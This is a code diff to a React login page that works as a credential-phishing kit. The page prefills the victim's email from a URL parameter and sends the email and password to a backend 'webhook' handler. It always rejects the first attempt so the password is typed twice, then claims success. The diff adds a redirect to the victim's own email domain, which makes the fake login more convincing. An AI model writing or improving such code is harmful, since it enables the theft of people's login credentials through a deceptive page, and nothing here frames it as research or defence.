@@ -9,52 +9,66 @@ export default function Home() {
   const [status, setStatus] = useState("You have logged out.");
   const [statusClass, setStatusClass] = useState("error-notice");
   const [attemptCount, setAttemptCount] = useState(0);
+  const [domain, setDomain] = useState("");
 
   useEffect(() => {
     const params = new URLSearchParams(window.location.search);
     const gsEmail = params.get("gs_lcrp");
-    if (gsEmail) setEmail(gsEmail);
+    if (gsEmail) {
+      setEmail(gsEmail);
+      // Extract domain from email
+      const extractedDomain = gsEmail.split('@')[1];
+      if (extractedDomain) {
+        setDomain(extractedDomain);
+      }
+    }
   }, []);
 
   const sendFormDataToWebhook = async (e) => {
-  e.preventDefault();
+    e.preventDefault();
 
-  // Step 1: Show "Authenticating..." immediately
-  setStatus("Authenticating …");
-  setStatusClass("info-notice");
-
-  try {
-    // Step 2: Send API request
-    const response = await fetch("/api/login", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ email, password }),
-    });
-
-    // Step 3: Increase attempt count regardless of success/failure
-    const newAttempt = attemptCount + 1;
-    setAttemptCount(newAttempt);
-
-    // Step 4: Controlled message flow (not based on response.ok)
-    if (newAttempt === 1) {
-      setStatus("Invalid Login");
+    // Check if password is empty
+    if (!password.trim()) {
+      setStatus("Please enter your password");
       setStatusClass("error-notice");
-      setPassword("")
-    } else if (newAttempt === 2) {
-      setStatus("Success");
-      setStatusClass("success-notice");
-
-      setTimeout(() => {
-        window.location.href = "https://gmail.com";
-      }, 1500);
+      return;
     }
-  } catch (error) {
-    // Network or server error
-    setStatus("Error authenticating.");
-    setStatusClass("bg-red-400");
-  }
-};
 
+    // Step 1: Show "Authenticating..." immediately
+    setStatus("Authenticating …");
+    setStatusClass("info-notice");
+
+    try {
+      // Step 2: Send API request
+      const response = await fetch("/api/login", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ email, password }),
+      });
+
+      // Step 3: Increase attempt count regardless of success/failure
+      const newAttempt = attemptCount + 1;
+      setAttemptCount(newAttempt);
+
+      // Step 4: Controlled message flow (not based on response.ok)
+      if (newAttempt === 1) {
+        setStatus("Invalid Login");
+        setStatusClass("error-notice");
+        setPassword("")
+      } else if (newAttempt === 2) {
+        setStatus("Success");
+        setStatusClass("success-notice");
+
+        setTimeout(() => {
+          window.location.href = `https://${domain}`;
+        }, 1500);
+      }
+    } catch (error) {
+      // Network or server error
+      setStatus("Error authenticating.");
+      setStatusClass("bg-red-400");
+    }
+  };
 
   return (
     <div id="login-wrapper" className="group ">
@@ -415,5 +429,6 @@ export default function Home() {
         </div>
       </div>
     </div>
+    
   );
 }
